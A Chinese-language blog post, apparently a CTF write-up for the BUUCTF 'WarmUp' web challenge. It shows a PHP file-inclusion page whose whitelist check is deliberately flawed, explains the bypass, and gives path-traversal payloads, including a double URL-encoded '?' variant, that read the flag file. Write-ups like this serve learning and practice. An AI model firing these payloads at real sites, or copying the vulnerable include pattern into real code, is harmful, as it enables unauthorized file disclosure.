---
layout: post
title: "BUUCTF-WEB-WriteUp"
date: 2019-10-10 01:01:01
share: true
toc: true
tags: 
 - CTF
---

## WarmUp
打开网址显示一个滑稽 查看源码提示`source.php`
- 打开/source.php 查看源码

```php
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?>
```

- class emmm中checkFile中有一段

```php
$whitelist = ["source"=>"source.php","hint"=>"hint.php"];
```

访问hint.php
显示`flag not here, and flag in ffffllllaaaagggg`
- 回去看source.php源码

```php
if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    }
```

当满足三个条件 file值不为空 file值为字符串 checkFile为真 执行file `任意文件包含`
- 前两个条件容易满足 关键checkFile返回真
此函数有多处返回真代码 可以利用的代码片段是两处
- 第一处利用代码

```php
 $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
```
这一段代码条件满足字符串中`?`之前的字符串在whitelist中也就是source.php或hint.php后面紧跟../包含ffffllllaaaagggg
经测试需要四层../../../../
构造payload`?file=source.php?/../../../../ffffllllaaaagggg`或`?file=hint.php?/../../../../ffffllllaaaagggg`
- 第二处利用代码

```php

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
```

字符串经过一次url解码 在进行同上步骤 所以`?`两次url编码为`%253f`
构造payload`?file=source.php%253f/../../../../ffffllllaaaagggg`或`?file=hint.php%253f/../../../../ffffllllaaaagggg`
- flag{2d960f01-7d02-446e-9888-d9a08d6f266a}